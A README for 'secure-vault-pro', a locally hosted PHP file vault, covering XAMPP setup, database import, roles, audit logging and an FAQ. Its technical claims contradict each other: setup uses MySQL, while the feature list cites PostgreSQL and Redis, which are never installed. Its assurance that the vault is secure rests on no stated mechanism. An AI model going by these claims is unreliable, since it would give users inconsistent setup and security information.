# 🔒 secure-vault-pro - Keep your private files safe today

[![](https://img.shields.io/badge/Download_Secure_Vault-Blue?style=for-the-badge)](https://github.com/orellanajeremias795-bit/secure-vault-pro)

## 📁 About the application

Secure-vault-pro protects your digital files. It uses a secure system to store your documents. Only authorized people access the folders you choose. The system records all activity so you see who accessed a file. This tool keeps data safe and organized.

## 🛠 Prerequisites for Windows

You need these items to run the vault on your computer:
*   A Windows 10 or 11 computer.
*   XAMPP installed on your hard drive. 
*   A web browser like Chrome or Firefox.
*   A basic understanding of starting services in the XAMPP Control Panel.

## 📥 How to download the software

1. Navigate to the main repository page.
2. Click the green "Code" button shown on the screen.
3. Select "Download ZIP" from the menu.
4. Save the file to your computer.
5. Extract the contents of the ZIP folder into your XAMPP htdocs directory.

[Visit the repository page to download](https://github.com/orellanajeremias795-bit/secure-vault-pro)

## ⚙️ Initial setup

The vault requires a database to store file information. Follow these steps to prepare your system:

1. Open the XAMPP Control Panel.
2. Click "Start" on the Apache and MySQL modules.
3. Open your web browser and type `http://localhost/phpmyadmin` in the address bar.
4. Create a new database named `vault_db`.
5. Import the file named `database.sql` found in the software folder. This fills the database with the tables needed to function.

## 🚀 Running the vault

After you configure the database, open your browser. Type `http://localhost/secure-vault-pro` into the address bar. The login screen appears. Use the default admin credentials provided in the installation guide to enter the dashboard.

## 🛡 Security features

*   **Role-Based Access Control:** You define which users see specific folders or documents.
*   **Audit Logging:** The system keeps a permanent record of every action taken within the vault. 
*   **Metadata Storage:** PostgreSQL manages file details like creation date and owner information.
*   **Performance Cache:** The software uses Redis to ensure fast load times even with many files.

## 🔑 User management 

The admin dashboard acts as the command center. From here, you create new user accounts. You assign roles to each person. Roles define if a user uploads, views, or deletes files. Review the audit log daily to maintain total visibility over your data.

## 📈 Dashboard features

The dashboard shows a summary of your vault. You see how many files exist. You see the latest upload events. Use the search bar to find documents by name or date. The interface uses icons to represent actions like upload and download.

## 🔧 Frequently asked questions

**Where does the application store my files?**
The system stores files in a protected folder within your XAMPP installation. 

**Is the vault secure?**
Yes. The vault uses local storage and strict access controls. Keep your XAMPP credentials private to maintain safety.

**How do I update the software?**
Download the latest version from the repository. Back up your existing `vault_db` before you overwrite any files.

**Does this work without XAMPP?**
No. This software requires a server environment to process the code and connect to the database.

## 📧 Support and feedback

Use the repository issues tab to ask questions. Describe your problem clearly. Include your error message if you see one. This allows others to assist you with the setup process. We rely on user reports to fix bugs and improve the system.

## 📋 System requirements

*   Processor: Intel Core i3 or better.
*   Memory: 4GB RAM minimum.
*   Storage: 200MB free space.
*   Network: Localhost connection support.

## ⚖️ License notice

This software uses an open source license. You use, modify, and share the code under the terms of the agreement. Refer to the license file in the main folder for specific details.